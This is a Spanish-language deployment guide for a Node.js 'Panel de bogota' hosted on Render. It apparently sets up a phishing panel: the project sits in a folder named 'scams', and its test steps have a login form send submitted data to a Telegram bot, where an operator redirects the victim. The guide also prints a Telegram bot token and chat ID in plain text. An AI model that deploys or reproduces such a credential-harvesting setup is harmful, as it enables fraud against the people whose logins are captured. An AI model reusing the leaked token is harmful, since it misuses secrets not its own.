# 🚀 Guía de Deployment en Render

## Repositorio GitHub
- **URL:** https://github.com/hanselrosales255/bogota.git

---

## Pasos para Deploy en Render

### 1. Preparar el Repositorio Local

```bash
# Asegurarse de estar en el directorio correcto
cd "C:\Users\Hansel\Desktop\esc\scams\Panel de bogota"

# Inicializar git si no está inicializado
git init

# Agregar todos los archivos
git add .

# Hacer commit
git commit -m "Deploy: Configuración completa con overlay optimizado"

# Agregar remote si no existe
git remote add origin https://github.com/hanselrosales255/bogota.git

# Verificar remote
git remote -v

# Subir a GitHub (forzar si es necesario)
git push -u origin main --force
```

---

### 2. Crear Web Service en Render

1. Ve a https://render.com
2. Inicia sesión
3. Click en **"New +"** → **"Web Service"**
4. Conecta tu repositorio: `hanselrosales255/bogota`
5. Configura el servicio:

#### Configuración Básica:
- **Name:** `panel-bogota` (o el nombre que prefieras)
- **Region:** Oregon (US West) o el más cercano
- **Branch:** `main`
- **Root Directory:** *(dejar vacío)*
- **Runtime:** `Node`
- **Build Command:** `npm install`
- **Start Command:** `npm start`

#### Plan:
- Selecciona **Free** (o el plan que prefieras)

---

### 3. Variables de Entorno en Render

En la sección **Environment**, agrega estas variables:

| Key | Value |
|-----|-------|
| `TELEGRAM_TOKEN` | `7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM` |
| `TELEGRAM_CHAT_ID` | `-1002638389042` |
| `NODE_ENV` | `production` |
| `PORT` | `3000` |

**IMPORTANTE:** Render asigna automáticamente la variable `PORT`, pero la dejamos por compatibilidad.

---

### 4. Desplegar

1. Click en **"Create Web Service"**
2. Render comenzará a:
   - Clonar tu repositorio
   - Ejecutar `npm install`
   - Ejecutar `npm start`
3. Espera 2-5 minutos

---

### 5. Verificar Deployment

Una vez desplegado, verás:
- ✅ Estado: **Live**
- 🌐 URL: `https://panel-bogota-xxxx.onrender.com`

#### Pruebas:
1. Abre la URL en tu navegador
2. Verifica que cargue la página de login
3. Completa un formulario de prueba
4. Verifica que llegue a Telegram
5. Presiona un botón en Telegram
6. Confirma que redirija correctamente

---

### 6. Logs en Vivo

Para ver logs en tiempo real:
1. Ve a tu servicio en Render Dashboard
2. Click en **"Logs"**
3. Verás:
   ```
   ✅ Bot de Telegram conectado: panelbogotabot
   📱 Bot ID: 7314533621
   🚀 Servidor iniciado exitosamente
   🚀 Puerto: XXXX
   ```

---

## 🔧 Solución de Problemas

### Build Fails
- Verifica que `package.json` tenga `"start": "node server.js"`
- Confirma que todas las dependencias estén en `package.json`

### Bot no conecta
- Verifica que `TELEGRAM_TOKEN` esté correctamente configurado
- Revisa los logs para errores

### Socket.io no funciona
- Render soporta WebSockets automáticamente
- No requiere configuración adicional

---

## 📝 Comandos Git Útiles

```bash
# Ver estado
git status

# Agregar cambios
git add .

# Commit
git commit -m "Descripción del cambio"

# Push
git push origin main

# Ver remote
git remote -v

# Cambiar remote si es necesario
git remote set-url origin https://github.com/hanselrosales255/bogota.git
```

---

## 🎯 Notas Importantes

1. **Primer Deploy:** Puede tardar hasta 10 minutos
2. **Redeploys:** Automáticos con cada push a `main`
3. **Plan Free:** El servicio se apaga después de 15 minutos de inactividad
4. **Cold Starts:** Primera solicitud después de inactividad puede tardar ~30 segundos

---

## ✅ Checklist Final

- [ ] Código subido a GitHub
- [ ] Web Service creado en Render
- [ ] Variables de entorno configuradas
- [ ] Deploy exitoso (estado: Live)
- [ ] Página carga correctamente
- [ ] Bot de Telegram conectado
- [ ] Formularios funcionan
- [ ] Redirecciones funcionan
- [ ] Overlay muestra "Cargando"

---

¡Listo para producción! 🚀
